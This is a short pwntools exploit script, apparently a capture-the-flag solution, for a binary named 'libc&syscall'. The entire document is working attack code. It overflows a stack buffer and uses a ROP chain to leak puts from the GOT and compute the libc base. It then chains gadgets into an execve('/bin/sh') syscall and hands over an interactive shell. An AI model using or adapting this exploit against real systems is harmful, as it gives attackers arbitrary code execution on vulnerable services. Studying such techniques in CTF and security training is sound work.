from pwn import *
context.log_level = 'debug'
#io = remote("localhost", 12347)
io = process(r"./libc&syscall")
elf = ELF(r"./libc&syscall")
libc = ELF('./libc.so.6')
rop = ROP(elf)
#gdb.attach(io, 'b *main')
payload = b'a'*0x38+p64(rop.find_gadget(['pop rdi', 'ret']).address) \
          +p64(elf.got.puts)+p64(elf.plt.puts)+p64(elf.sym.main)
io.send(payload)
io.recv(0x3c)
puts = u64(io.recv(6).ljust(8, b'\x00'))
base = puts - libc.sym.puts
log.success(hex(base))
rdi = rop.find_gadget(["pop rdi", "ret"]).address
rsi = rop.find_gadget(["pop rsi", "ret"]).address
rdx = rop.find_gadget(["pop rdx", "ret"]).address
rax = rop.find_gadget(["pop rax", "ret"]).address
syc = rop.find_gadget(["syscall", "ret"]).address
payload = b'a'*0x38+p64(rdi)+p64(base+libc.search(b"/bin/sh\x00").__next__()) +\
          p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(rax)+p64(59)+p64(syc)
          
io.send(payload)
io.interactive()
